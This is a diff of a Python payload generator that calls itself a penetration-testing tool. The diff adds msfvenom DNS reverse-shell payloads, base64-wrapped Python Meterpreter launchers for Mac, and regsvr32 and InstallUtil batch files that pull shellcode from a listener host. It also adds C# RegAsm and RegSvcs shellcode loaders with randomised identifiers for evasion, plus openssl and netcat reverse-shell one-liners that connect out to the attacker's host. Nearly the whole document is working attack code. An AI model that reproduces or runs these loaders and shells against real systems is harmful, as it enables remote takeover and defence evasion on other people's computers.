@@ -62,7 +62,8 @@ SHELLPY_PORT = randomPort(4)
 SHELLOS32_PORT = randomPort(4)
 # OSX 64 bit SHELL Port
 SHELLOS64_PORT = randomPort(4)
-
+# DNS Port
+DNSPORT = '53'
 
 
 # 32 bit MET payload
@@ -84,12 +85,13 @@ SHELL64_SL_Payload = "windows/x64/shell_reverse_tcp"
 # Python MET payload
 METPY_Payload = "python/meterpreter/reverse_tcp"
 # Python SHELL payload
-SHELLPY_Payload = "python/shell/reverse_tcp"
+SHELLPY_Payload = "python/shell_reverse_tcp"
 # OSX 32 bit SHELL payload
 SHELLOS32_Payload = "osx/x86/shell_reverse_tcp"
 # OSX 64 bit SHELL payload
 SHELLOS64_Payload = "osx/x64/shell_reverse_tcp"
-
+# DNS 32 bit SHELL Payload 
+SHELLDNSWIN = "windows/shell/reverse_tcp_dns"
 
 
 
@@ -206,7 +208,12 @@ set LPORT %s
 set ExitOnSession false
 exploit -j
 
-""" % (METRT32_Payload, listener_ip, METRT32_PORT, METRT32_SL_Payload, listener_ip,  METRT32_SL_PORT, METRT64_Payload, listener_ip, METRT64_PORT, METRT64_SL_Payload, listener_ip, METRT64_SL_PORT, SHELL32_Payload, listener_ip, SHELL32_PORT, SHELL32_SL_Payload, listener_ip, SHELL32_SL_PORT, SHELL64_Payload, listener_ip, SHELL64_PORT, SHELL64_SL_Payload, listener_ip, SHELL64_SL_PORT, METPY_PORT, listener_ip, METPY_Payload, SHELLPY_Payload, listener_ip, SHELLPY_PORT, SHELLOS32_Payload, listener_ip, SHELLOS32_PORT, SHELLOS64_Payload, listener_ip, SHELLOS64_PORT ))
+set payload %s
+set LHOST %s
+set LPORT %s
+set ExitOnSession false 
+exploit -j
+""" % (METRT32_Payload, listener_ip, METRT32_PORT, METRT32_SL_Payload, listener_ip,  METRT32_SL_PORT, METRT64_Payload, listener_ip, METRT64_PORT, METRT64_SL_Payload, listener_ip, METRT64_SL_PORT, SHELL32_Payload, listener_ip, SHELL32_PORT, SHELL32_SL_Payload, listener_ip, SHELL32_SL_PORT, SHELL64_Payload, listener_ip, SHELL64_PORT, SHELL64_SL_Payload, listener_ip, SHELL64_SL_PORT, METPY_Payload, listener_ip, METPY_PORT, SHELLPY_Payload, listener_ip, SHELLPY_PORT, SHELLOS32_Payload, listener_ip, SHELLOS32_PORT, SHELLOS64_Payload, listener_ip, SHELLOS64_PORT, SHELLDNSWIN, listener_ip, DNSPORT))
   msf_resource_file.close()
 
 
@@ -264,10 +271,10 @@ def gen_100():
   global listener_ip
   print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are generating Python  Payloads NOW!" + bcolors.ENDC)
   print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 100-Staged-MET-Python payload -------")
-  os.system("msfvenom -p " + METPY_Payload + " LHOST=" + listener_ip + " LPORT=" + METPY_PORT + " --platform Python -a python  >" + targetfile + "100-python-met.py")
+  os.system("msfvenom -p " + METPY_Payload + " LHOST=" + listener_ip + " LPORT=" + METPY_PORT + "   >" + targetfile + "100-python-met.py")
 
-  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 100-Staged-SHELL-Python payload -------")
-  os.system("msfvenom -p " + SHELLPY_Payload + " LHOST=" + listener_ip + " LPORT=" + SHELLPY_PORT + " --platform Python -a python  >" + targetfile + "100-python-met.py")
+  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 101-Staged-SHELL-Python payload -------")
+  os.system("msfvenom -p " + SHELLPY_Payload + " LHOST=" + listener_ip + " LPORT=" + SHELLPY_PORT + "  >" + targetfile + "101-python-shell.py")
 
 
 
@@ -281,6 +288,30 @@ def gen_200():
   print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 201 32bit OSX VBA payload -------")
   os.system("msfvenom -p " + SHELLOS32_Payload + " LHOST=" + listener_ip + " LPORT=" + SHELLOS32_PORT + " --platform OSX -a x86  -f vba  >" + targetfile + "201-OSX-Shell.vba")
 
+def gen_201():
+  global listener_ip
+  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are generating OSX 32bit Python  Payloads NOW!" + bcolors.ENDC)
+  shellcode = subprocess.check_output("msfvenom -p {0} LHOST={1} LPORT={2} ".format(METPY_Payload, listener_ip, METPY_PORT), shell=True)
+  shellcode = shellcode.decode('ascii')
+  Shellcode = base64.b64encode(bytes(shellcode, 'latin-1')).decode('ascii')
+
+  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 202-MAC-MetPy.sh file...")
+  MAC_METPY_file = open(targetfile + "202-MAC-MetPy.sh", "w")
+  MAC_METPY_file.write("""#!/bin/bash
+python -c "$(printf '%s' '{0}' | base64 -D)"
+""".format(Shellcode))
+  MAC_METPY_file.close()
+
+  shellcode = subprocess.check_output("msfvenom -p {0} LHOST={1} LPORT={2} ".format(SHELLPY_Payload, listener_ip, SHELLPY_PORT), shell=True)
+  shellcode = shellcode.decode('ascii')
+  Shellcode = base64.b64encode(bytes(shellcode, 'latin-1')).decode('ascii')
+
+  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 202-MAC-ShellPy.sh file...")
+  MAC_shPY_file = open(targetfile + "202-MAC-ShellPy.sh", "w")
+  MAC_shPY_file.write("""#!/bin/bash
+python -c "$(printf '%s' '{0}' | base64 -D)"
+""".format(Shellcode))
+  MAC_shPY_file.close()
 
 ##  64 bit MAC  MSFVenom  MeterpreterShell
 def gen_210():
@@ -399,6 +430,17 @@ def gen_340():
 """ % listener_ip)
   shellreg32_bat_file.close()
 
+  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are generating the 32bit DNS SHELL RegSrv32  Payloads NOW!" + bcolors.ENDC)
+  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 340 32bit Base64 payload -------")
+  os.system("msfvenom -p " + SHELLDNSWIN + " CMD=calc.exe LHOST=" + listener_ip + " LPORT=" + DNSPORT + "  --platform win -a x86 EXITFUNC=thread  -f raw 2>/dev/null | base64 >" + targetfile + "342-SHELL32.b64")
+
+
+  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 32 bit Reg Shell BAT file...")
+  shelreg32_bat_file = open(targetfile + "343-Reg-DNS-32.bat", "w")
+  shelreg32_bat_file.write("""cmd /k c:\Windows\System32\Regsvr32.exe /s /i:shellcode,http://%s/342-DNS32.b64 322-WEV_x86.dll
+""" % listener_ip)
+  shelreg32_bat_file.close()
+
 
 ##  regsrv32 64 bit Shell DLL EVADE
 def gen_350():
@@ -415,52 +457,12 @@ def gen_350():
   shellreg64_bat_file.close()
 
 
-##  32 bit regsrv32 32 bit Shell DLL EVADE PS Empire
-def gen_360():
-  global listener_ip
-  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are generating 32bit PowerShell Empire RegSrv32  Payloads NOW!" + bcolors.ENDC)
-  empire = "/opt/Empire"
-  if not os.path.exists(empire):
-      print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Installing PS Empire NOW ------>")
-      os.system("cd /opt/ && git clone https://github.com/EmpireProject/Empire.git")
-      os.system("/opt/Empire/setup/install.sh")
-
-  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 32 bit Reg PS Empire  BAT file...")
-  psreg32_bat_file = open(targetfile + "361-Reg-Empire-32.bat", "w")
-  psreg32_bat_file.write("""cmd /k c:\Windows\System32\Regsvr32.exe /s /i:shellcode,http://%s/360-Empire.b64 322-WEV_x86.dll
-""" % listener_ip)
-  psreg32_bat_file.close()
-
-
-  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Creatingi PS Empire  Howto file...")
-  pshtreg32_bat_file = open(targetfile + "362-Reg-Empire-HowTo.txt", "w")
-  pshtreg32_bat_file.write("""
-cd /opt/Empire
-./empire
-listeners
-uselistener http
-set Host %s
-set Port 4444
-set Name http
-execute
-back
-launcher powershell http
-(Copy all of the base64 encoded data. It is the data following -enc)
-
-In another window
-cd /opt/malwaredefense/current
-nano 360-Empire.b64
-(Paste copied base64 string and save)
-
-(Launch Batch file on target computer and wait for a connection within Empire)
-""" % listener_ip)
-  pshtreg32_bat_file.close()
-
 ##  Installme
 def gen_400():
   global listener_ip
   print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are generating the  InstallUtil  Payloads NOW!" + bcolors.ENDC)
   print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 400 32bit Base64 payload -------")
+
   os.system("msfvenom -p " + SHELL32_Payload + " CMD=calc.exe LHOST=" + listener_ip + " LPORT=" + SHELL32_PORT + " --platform win -a x86 EXITFUNC=thread -f raw  | base64 >" + targetfile + "400-SHELL32.b64")
 
 
@@ -468,6 +470,13 @@ def gen_400():
   SHELLINST_bat_file = open(targetfile + "402-InstallUtil-Shell.bat", "w")
   SHELLINST_bat_file.write(r"cmd /k c:\Windows\Microsoft.NET\Framework\v4.0.30319\Installutil.exe /u /f=http://"+listener_ip+r"/400-SHELL32.b64 402-installme_x86.dll")
   SHELLINST_bat_file.close()
+
+  os.system("msfvenom -p " + SHELLDNSWIN + " CMD=calc.exe LHOST=" + listener_ip + " LPORT=" + DNSPORT + " --platform win -a x86 EXITFUNC=thread -f raw  | base64 >" + targetfile + "401-SHELL32.b64")
+
+  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 32 bit InstallUtil DNS SHELL BAT file...")
+  SHELINST_bat_file = open(targetfile + "401-InstallUtil-DNS.bat", "w")
+  SHELINST_bat_file.write(r"cmd /k c:\Windows\Microsoft.NET\Framework\v4.0.30319\Installutil.exe /u /f=http://"+listener_ip+r"/401-SHELL32.b64 402-installme_x86.dll")
+  SHELINST_bat_file.close()
 
   print("\tMoving files!!")
   os.system("cp ./src/installme_x86.dll " + targetfile + "402-installme_x86.dll")
@@ -665,13 +674,12 @@ def gen_410():
   msbmet_bat_file.write(r"cmd /k c:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe 412-MSBuild-PS.xml")
   msbmet_bat_file.close()
 
-
-##  Presentation HOst
+##  Presentation Host
 def gen_420():
   global listener_ip
   print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are setting up Presentation Host payload  NOW!" + bcolors.ENDC)
   print("\tMoving files!!")
-  os.system("cp ./src/PWN-PS-W.zip " + targetfile + "400-PWN-PS-W.zip")
+  os.system("cp ./src/PWN-PS-W.zip " + targetfile + "420-PWN-PS-W.zip")
 
 ##  RegAsm
 def gen_430():
@@ -756,12 +764,80 @@ def gen_430():
 
   os.system("mcs -platform:x86 -target:library -r:System.EnterpriseServices,System.Windows.Forms " + targetfile + "430-RegAsm-MET.cs  -out:" + targetfile +"430-Regasm-Met.dll")
 
-  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 32 bit MSBuild MET BAT file...")
+  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 32 bit RegAsm MET BAT file...")
   asmmet_bat_file = open(targetfile + "431-RegAsm-MET.bat", "w")
   asmmet_bat_file.write(r"cmd /k C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U 430-Regasm-Met.dll")
   asmmet_bat_file.close()
 
-  print(bcolors.ERROR + bcolors.BOLD + "***I still need to create a basic shell and PowerShell payload for RegAsm ***" + bcolors.ENDC)
+def gen_431():
+  global listener_ip
+  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are generating Shell  RegAsm payloads  NOW!" + bcolors.ENDC)
+
+  shellcode = subprocess.check_output("msfvenom -p {0} LHOST={1} LPORT={2} -f c | tr -d \'\"\' | tr -d \'\n\'".format(SHELL32_Payload, listener_ip, SHELL32_PORT), shell=True)
+  shellcode = shellcode.decode('ascii')
+  Shellcode = base64.b64encode(bytes(shellcode, 'latin-1')).decode('ascii')
+
+  className = randomString(10)
+  classNameTwo = randomString(9)
+  namespace = randomString(8)
+  key = randomString()
+  execName = randomString(11)
+  bytearrayName = randomString(12)
+  funcAddrName = randomString(8)
+  savedStateName = randomString(9)
+  messWithAnalystName = randomString(7)
+  shellcodeName = randomString()
+  rand_bool = randomString(10)
+  random_out = randomString(8)
+  hThreadName = randomString(7)
+  threadIdName = randomString(9)
+  pinfoName = randomString(12)
+
+  y = [randomString(10) for x in range(17)]
+
+  ashell = "using System; using System.Net; using System.Linq; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading; using System.EnterpriseServices; using System.Windows.Forms;\n"
+  ashell += "namespace {0}\n {{".format(namespace)
+  ashell += "\n\tpublic class {0} : ServicedComponent {{\n".format(className)
+  ashell += '\n\t\tpublic {0}() {{ Console.WriteLine("doge"); }}\n'.format(className)
+  ashell += "\n\t\t[ComRegisterFunction]"
+  ashell += "\n\t\tpublic static void RegisterClass ( string {0} )\n\t\t{{\n".format(key)
+  ashell += "\t\t\t{0}.{1}();\n\t\t}}\n".format(classNameTwo, execName)
+  ashell += "\n[ComUnregisterFunction]"
+  ashell += "\n\t\tpublic static void UnRegisterClass ( string {0} )\n\t\t{{\n".format(key)
+  ashell += "\t\t\t{0}.{1}();\n\t\t}}\n\t}}\n".format(classNameTwo, execName)
+  ashell += "\n\tpublic class {0}\n\t{{".format(classNameTwo)
+  ashell += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 HeapCreate(UInt32 %s, UInt32 %s, UInt32 %s); \n[DllImport(\"kernel32\")] private static extern UInt32 HeapAlloc(UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 RtlMoveMemory(UInt32 %s, byte[] %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s, IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);"""%(y[0],y[1],y[2],y[3],y[4],y[5],y[6],y[7],y[8],y[9],y[10],y[11],y[12],y[13],y[14],y[15],y[16])
+  ashell += "\n\t\tpublic static void {0}() {{\n".format(execName)
+  ashell += "\t\t\tstring %s = System.Text.ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(\"%s\"));\n" % (bytearrayName, Shellcode)
+  ashell += "\t\t\tstring[] chars = %s.Split(',').ToArray();\n" %(bytearrayName)
+  ashell += "\t\t\tbyte[] %s = new byte[chars.Length];\n" %(shellcodeName)
+  ashell += "\t\t\tfor (int i = 0; i < chars.Length; ++i) { %s[i] = Convert.ToByte(chars[i], 16); }\n"  %(shellcodeName)
+
+  rand_heap = randomString(9)
+  rand_ptr = randomString()
+  rand_var = randomString(8)
+
+  ashell += '\t\t\tUInt32 {} = HeapCreate(0x00040000, (UInt32){}.Length, 0);\n'.format(rand_heap, shellcodeName)
+  ashell += '\t\t\tUInt32 {} = HeapAlloc({}, 0x00000008, (UInt32){}.Length);\n'.format(rand_ptr, rand_heap, shellcodeName)
+  ashell += '\t\t\tRtlMoveMemory({}, {}, (UInt32){}.Length);\n'.format(rand_ptr, shellcodeName, shellcodeName)
+  ashell += '\t\t\tUInt32 {} = 0;\n'.format(rand_var)
+  ashell += '\t\t\tIntPtr {} = CreateThread(0, 0, {}, IntPtr.Zero, 0, ref {});\n'.format(hThreadName, rand_ptr, rand_var)
+  ashell += '\t\t\tWaitForSingleObject({}, 0xFFFFFFFF);\n'.format(hThreadName)
+  ashell += "                        }\n"
+  ashell += "               }\n"
+  ashell += "       }\n"
+
+
+  ashell_cs_file = open(targetfile + "432-RegAsm-Shell.cs", "w")
+  ashell_cs_file.write(ashell)
+  ashell_cs_file.close()
+
+  os.system("mcs -platform:x86 -target:library -r:System.EnterpriseServices,System.Windows.Forms " + targetfile + "432-RegAsm-Shell.cs  -out:" + targetfile +"432-Regasm-Shell.dll")
+
+  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 32 bit  RegAsm Shell BAT file...")
+  asmmet_bat_file = open(targetfile + "433-RegAsm-Shell.bat", "w")
+  asmmet_bat_file.write(r"cmd /k C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U 432-Regasm-Shell.dll")
+  asmmet_bat_file.close()
 
 
 ##  Regsvcs
@@ -851,10 +927,80 @@ def gen_440():
 
   print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 32 bit Regsvcs MET BAT file...")
   svcsmet_bat_file = open(targetfile + "441-Regsvcs-MET.bat", "w")
-  svcsmet_bat_file.write(r"cmd /k C:\Windows\Microsoft.NET\Framework\v4.0.30319\resvcs.exe 440-Regsvcs-Met.dll")
+  svcsmet_bat_file.write(r"cmd /k C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe 440-Regsvcs-Met.dll")
   svcsmet_bat_file.close()
 
-  print(bcolors.ERROR + bcolors.BOLD + "***I still need to create a basic shell and PowerShell payload for Regsvcs ***" + bcolors.ENDC)
+
+def gen_441():
+  global listener_ip
+  print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tWe are generating Shell  RegSvcs payloads  NOW!" + bcolors.ENDC)
+
+  shellcode = subprocess.check_output("msfvenom -p {0} LHOST={1} LPORT={2} -f c | tr -d \'\"\' | tr -d \'\n\'".format(SHELL32_Payload, listener_ip, SHELL32_PORT), shell=True)
+  shellcode = shellcode.decode('ascii')
+  Shellcode = base64.b64encode(bytes(shellcode, 'latin-1')).decode('ascii')
+
+  className = randomString(8)
+  classNameTwo = randomString(9)
+  namespace = randomString(10)
+  key = randomString(9)
+  execName = randomString(8)
+  bytearrayName = randomString(9)
+  funcAddrName = randomString(7)
+  savedStateName = randomString()
+  messWithAnalystName = randomString(8)
+  shellcodeName = randomString(13)
+  rand_bool = randomString(12)
+  random_out = randomString(11)
+  hThreadName = randomString(8)
+  threadIdName = randomString(7)
+  pinfoName = randomString(9)
+
+  y = [randomString(10) for x in range(17)]
+
+  svcshell = "using System; using System.Net; using System.Linq; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading; using System.EnterpriseServices; using System.Windows.Forms;\n"
+  svcshell += "namespace {0}\n {{".format(namespace)
+  svcshell += "\n\tpublic class {0} : ServicedComponent {{\n".format(className)
+  svcshell += '\n\t\tpublic {0}() {{ Console.WriteLine("doge"); }}\n'.format(className)
+  svcshell += "\n\t\t[ComRegisterFunction]"
+  svcshell += "\n\t\tpublic static void RegisterClass ( string {0} )\n\t\t{{\n".format(key)
+  svcshell += "\t\t\t{0}.{1}();\n\t\t}}\n".format(classNameTwo, execName)
+  svcshell += "\n[ComUnregisterFunction]"
+  svcshell += "\n\t\tpublic static void UnRegisterClass ( string {0} )\n\t\t{{\n".format(key)
+  svcshell += "\t\t\t{0}.{1}();\n\t\t}}\n\t}}\n".format(classNameTwo, execName)
+  svcshell += "\n\tpublic class {0}\n\t{{".format(classNameTwo)
+  svcshell += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 HeapCreate(UInt32 %s, UInt32 %s, UInt32 %s); \n[DllImport(\"kernel32\")] private static extern UInt32 HeapAlloc(UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 RtlMoveMemory(UInt32 %s, byte[] %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s, IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);"""%(y[0],y[1],y[2],y[3],y[4],y[5],y[6],y[7],y[8],y[9],y[10],y[11],y[12],y[13],y[14],y[15],y[16])
+  svcshell += "\n\t\t\tpublic static void {0}() {{\n".format(execName)
+  svcshell += "\t\t\tstring %s = System.Text.ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(\"%s\"));\n" % (bytearrayName, Shellcode)
+  svcshell += "\t\t\tstring[] chars = %s.Split(',').ToArray();\n" %(bytearrayName)
+  svcshell += "\t\t\tbyte[] %s = new byte[chars.Length];\n" %(shellcodeName)
+  svcshell += "\t\t\tfor (int i = 0; i < chars.Length; ++i) { %s[i] = Convert.ToByte(chars[i], 16); }\n"  %(shellcodeName)
+
+  rand_heap = randomString(10)
+  rand_ptr = randomString()
+  rand_var = randomString(9)
+
+  svcshell += '\t\t\tUInt32 {} = HeapCreate(0x00040000, (UInt32){}.Length, 0);\n'.format(rand_heap, shellcodeName)
+  svcshell += '\t\t\tUInt32 {} = HeapAlloc({}, 0x00000008, (UInt32){}.Length);\n'.format(rand_ptr, rand_heap, shellcodeName)
+  svcshell += '\t\t\tRtlMoveMemory({}, {}, (UInt32){}.Length);\n'.format(rand_ptr, shellcodeName, shellcodeName)
+  svcshell += '\t\t\tUInt32 {} = 0;\n'.format(rand_var)
+  svcshell += '\t\t\tIntPtr {} = CreateThread(0, 0, {}, IntPtr.Zero, 0, ref {});\n'.format(hThreadName, rand_ptr, rand_var)
+  svcshell += '\t\t\tWaitForSingleObject({}, 0xFFFFFFFF);\n'.format(hThreadName)
+  svcshell += "                        }\n"
+  svcshell += "               }\n"
+  svcshell += "       }\n"
+
+
+  svcsmet_cs_file = open(targetfile + "442-Regsvcs-Shell.cs", "w")
+  svcsmet_cs_file.write(svcshell)
+  svcsmet_cs_file.close()
+
+  os.system("sn -k /tmp/key.snk")
+  os.system("mcs -platform:x86 -target:library -keyfile:/tmp/key.snk -r:System.EnterpriseServices,System.Windows.Forms " + targetfile + "442-Regsvcs-Shell.cs  -out:" + targetfile +"442-Regsvcs-Shell.dll")
+
+  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 32 bit Regsvcs Shell BAT file...")
+  svcsmet_bat_file = open(targetfile + "443-Regsvcs-Shell.bat", "w")
+  svcsmet_bat_file.write(r"cmd /k C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe 442-Regsvcs-Shell.dll")
+  svcsmet_bat_file.close()
 
 ##Shells
 def Shells():
@@ -874,23 +1020,27 @@ def Shells():
   rp11 = randomPort()
   rp12 = randomPort()
   rp13 = randomPort()
+  rp14 = randomPort()
+  rp15 = randomPort()
 
   print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tLets Play with some Shells!!" + bcolors.ENDC)
   while(1):
     print(bcolors.ERROR + "\t*******************************************************************" + bcolors.ENDC)
-    print("\t(1)\tBASH Reverse Shell --------- (Linux|Unix)")
-    print("\t(2)\tPERL Reverse Shell --------- (Linux|Unix)")
+    print("\t(1)\tBASH Reverse Shell --------- (Linux|Unix|Mac)")
+    print("\t(2)\tPERL Reverse Shell --------- (Linux|Unix|Mac)")
     print("\t(3)\tPERL Reverse Shell --------- (Windows)")
     print("\t(4)\tPowerShell Reverse Shell --- (Windows)")
-    print("\t(5)\tPython Reverse Shell ------- (Linx|Unix)")
+    print("\t(5)\tPython Reverse Shell ------- (Linx|Unix|Mac)")
     print("\t(6)\tPython Reverse Shell ------- (Windows)")
-    print("\t(7)\tPHP Reverse Shell ---------- (Linux|Unix)")
-    print("\t(8)\tRuby Reverse Shell --------- (Linux|Unix)")
+    print("\t(7)\tPHP Reverse Shell ---------- (Linux|Unix|Mac)")
+    print("\t(8)\tRuby Reverse Shell --------- (Linux|Unix|Mac)")
     print("\t(9)\tRuby Reverse Shell --------- (Windows)")
     print("\t(10)\tGolang Reverse Shell ------- (Linux|Unix)")
     print("\t(11)\tAwk Reverse Shell ---------- (Linux|Unix)")
     print("\t(12)\tJava Reverse Shell --------- (Linux|Unix)")
     print("\t(13)\tJava Reverse Shell --------- (Windows)")
+    print("\t(14)\tOpenSSL Shell -------------- (Linux|Unix|Mac)")
+    print("\t(15)\tNetCat MAC Shell ----------- (Mac)")
     print("\t(99)\tGo back to the main menu")
     print(bcolors.BLUE + "\t*******************************************************************" + bcolors.ENDC)
 
@@ -1037,10 +1187,36 @@ String cmd="cmd.exe";
         print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp13))
         print("\t NOTE:\t Use this shell when you have access to a Java based web application and the OS in use is Windows. Things like Jinkens, etc..\n")
         print("\t*******************************************************************\n")
+    elif options == "14":
+        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tOpenSSL Reverse  SHELL\t\t***\n" + bcolors.ENDC)
+        print("\t*******************************************************************\n")
+
+        fName = randomString()
+
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + """
+mkfifo /tmp/{2}; /bin/sh -i < /tmp/{2} 2>&1 | openssl s_client -quiet -connect {0}:{1} > /tmp/{2}; rm /tmp/{2}
+""".format(listener_ip, rp14, fName))
+        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tJava Linux Listener\t\t***\n" + bcolors.ENDC)
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy listener: " + bcolors.ENDC + """
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port %s
+""" %(rp14))
+        print("\t NOTE:\t This is a really cool shell method. It works great.\n")
+        print("\t*******************************************************************\n")
+    elif options == "15":
+        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tNetCat Mac SHELL\t\t***\n" + bcolors.ENDC)
+        print("\t*******************************************************************")
+        fifoName = randomString(8)
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "mkfifo /tmp/{0}; nc {1} {2} </tmp/{0} | /bin/bash -i > /tmp/{0} 2>&1; rm /tmp/{0}".format(fifoName, listener_ip, rp15))
+        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tNetCat Mac Listener\t\t***\n" + bcolors.ENDC)
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp15))
+        print("\t NOTE:\t  This  works Great. NC is installed on MAC by default, however it does not support the -e flag so you have to use a fifo pipe file.\n")
+        print("\t*******************************************************************\n")
+
     elif options == "99":
         break
     else:
-       input("Go ahead and pick the shell you need!: ")
+       input("Go ahead and pick the shell you need!... ")
 
 ## Malware Sub-menu 
 def Malware():
@@ -1051,6 +1227,7 @@ def Malware():
     print("\t(2)\tGenerate only Bypass-----(this would be for Pen test)")
     print("\t(3)\tGenerate Marantal the Mantroll Special-----(my fav stuff)")
     print("\t(4)\tGenerate only Malware that does not use Meterpreter")
+    print("\t(5)\tGenerate only MAC and Python Malware ")
     print("\t(99)\tGo back to the main menu")
     print(bcolors.BLUE + "\t*******************************************************************" + bcolors.ENDC)
 
@@ -1062,6 +1239,7 @@ def Malware():
        gen_020()
        gen_100()
        gen_200()
+       gen_201()
        gen_210()
        gen_300()
        gen_320()
@@ -1069,13 +1247,14 @@ def Malware():
        gen_340()
        gen_340()
        gen_350()
-       gen_360()
        gen_400()
        gen_401()
        gen_410()
        gen_420()
        gen_430()
+       gen_431()
        gen_440()
+       gen_441()
        rc_file()
     elif options == "2":
        archFile()
@@ -1084,13 +1263,14 @@ def Malware():
        gen_330()
        gen_340()
        gen_350()
-       gen_360()
        gen_400()
        gen_401()
        gen_410()
        gen_420()
        gen_430()
+       gen_431()
        gen_440()
+       gen_441()
        rc_file()
     elif options == "3":
        archFile()
@@ -1099,7 +1279,9 @@ def Malware():
        gen_410()
        gen_420()
        gen_430()
+       gen_431()
        gen_440()
+       gen_441()
        rc_file()
     elif options == "4":
        archFile()
@@ -1107,6 +1289,15 @@ def Malware():
        gen_340()
        gen_350()
        gen_400()
+       gen_431()
+       gen_441()
+       rc_file()
+    elif options == "5":
+       archFile()
+       gen_100()
+       gen_200()
+       gen_201()
+       gen_210()
        rc_file()
     elif options == "99":
        break
@@ -1187,14 +1378,14 @@ def main():
   print("""\
                    Thanks all that helped and to the tidepod.
                     NSTS Cyber Security Penetration Testers
-                                 version0.1
+                                 version0.2
 """)
 
   if (listener_ip == "127.0.0.1"):
       local_ip = get_local_ip(interface)
       wireless = get_local_ip(winterface)
       print("The eth0 interface has: {0} : as its address. The wlan0 interface has: {1} : as its address.\n".format(local_ip, wireless) + bcolors.ERROR + bcolors.BOLD + "If you do not input a listener address it will default to the eth0 interface address\n\n" + bcolors .ENDC)
-      listener_ip = input("\tEnter IP Address for the Listenser:  ") or local_ip 
+      listener_ip = input("\tEnter IP Address for the Listener:  ") or local_ip 
 
   print("\n\tYOU HAVE SET THE LHOST TO:   %s " % listener_ip)
   archFile()
